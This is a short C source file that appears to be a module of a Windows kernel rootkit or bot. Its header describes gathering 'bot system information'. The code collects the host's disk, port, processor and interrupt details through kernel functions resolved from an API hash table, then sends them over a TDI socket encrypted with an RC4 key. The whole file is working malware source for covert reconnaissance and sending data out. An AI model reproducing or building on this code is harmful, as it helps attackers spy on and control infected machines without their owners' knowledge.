#include "common.h"

/*///////////////////////////////////////
//
//	File: info.c
//
//	Gather bot system information
//
//
*////////////////////////////////////////

NTSTATUS rk_send_sys_information_to_userspace(IN PFILE_OBJECT SocketObject, IN PROOTKIT_API_HASH Hash)
{
	NTSTATUS st = STATUS_SUCCESS;
	ROOTKIT_SYS_INFORMATION sysinfo = { 0 };
	INT sendsize = 0;
	PCONFIGURATION_INFORMATION configinformation = NULL;

	// BASIC CONFIGURATION INFORMATION 

	configinformation = Hash->_IoGetConfigurationInformation();

	sysinfo.NumberOfCdRoms			= configinformation->CdRomCount;
	sysinfo.NumberOfDisks			= configinformation->DiskCount;
	sysinfo.NumberOfFloppies		= configinformation->FloppyCount;
	sysinfo.NumberOfParallelPorts	= configinformation->ParallelCount;
	sysinfo.NumberOfSerialPorts		= configinformation->SerialCount;
	sysinfo.ScsiCount				= configinformation->ScsiPortCount;
	sysinfo.TapeDrivesCount			= configinformation->TapeCount;

	// KeQuery

	sysinfo.ActiveGroupCount = Hash->_KeQueryActiveGroupCount();
	sysinfo.ActiveProcessors = Hash->_KeQueryActiveProcessors();
	sysinfo.ActiveProcessorsCount = Hash->_KeQueryActiveProcessorCount(&sysinfo.ActiveProcessors);
	sysinfo.InterruptTime = Hash->_KeQueryInterruptTime();
	sysinfo.MaximunProcessorCount = Hash->_KeQueryMaximumProcessorCount();


	sendsize = tdi_send_crypted(SocketObject, RC4_KEY_2, (PROOTKIT_SYS_INFORMATION)&sysinfo, sizeof(ROOTKIT_SYS_INFORMATION), 0);	
	if (sendsize > 0)
		KdPrint(("\r\n[*] kit sys info sent"));
	else
		KdPrint(("\r\n[!] Error sending kit sys info"));

	return st;
}